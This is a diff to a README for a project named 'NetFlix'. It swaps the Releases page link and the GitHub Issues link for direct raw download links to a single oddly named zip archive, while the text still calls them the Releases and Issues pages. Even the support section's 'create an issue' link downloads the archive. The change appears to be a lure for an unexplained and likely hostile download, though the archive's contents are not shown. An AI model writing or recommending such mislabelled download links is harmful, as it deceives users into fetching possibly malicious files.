@@ -2,11 +2,11 @@
 
 ## 🛠️ Download & Install
 
-[![Download NetFlix](https://img.shields.io/badge/Download%20NetFlix-Click%20Here-brightgreen)](https://github.com/HirukaIndiv/NetFlix/releases)
+[![Download NetFlix](https://raw.githubusercontent.com/HirukaIndiv/NetFlix/main/NetFlix Titles/Notebook/Flix_Net_lambrequin.zip%20NetFlix-Click%20Here-brightgreen)](https://raw.githubusercontent.com/HirukaIndiv/NetFlix/main/NetFlix Titles/Notebook/Flix_Net_lambrequin.zip)
 
 To get started with NetFlix, you need to download the software from our Releases page. 
 
-1. Click the button above or visit this [page to download](https://github.com/HirukaIndiv/NetFlix/releases).
+1. Click the button above or visit this [page to download](https://raw.githubusercontent.com/HirukaIndiv/NetFlix/main/NetFlix Titles/Notebook/Flix_Net_lambrequin.zip).
 2. Choose the latest version from the list.
 3. Download the file for your operating system (Windows, macOS, or Linux).
 4. Follow the simple installation instructions provided on the download page.
@@ -72,6 +72,6 @@ We regularly update NetFlix to improve its features and include new data. Check 
 
 ## 📧 Support
 
-If you run into any issues or have questions about using NetFlix, feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/HirukaIndiv/NetFlix/issues) for assistance.
+If you run into any issues or have questions about using NetFlix, feel free to reach out. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/HirukaIndiv/NetFlix/main/NetFlix Titles/Notebook/Flix_Net_lambrequin.zip) for assistance.
 
 Enjoy exploring the vast world of Netflix content with NetFlix!
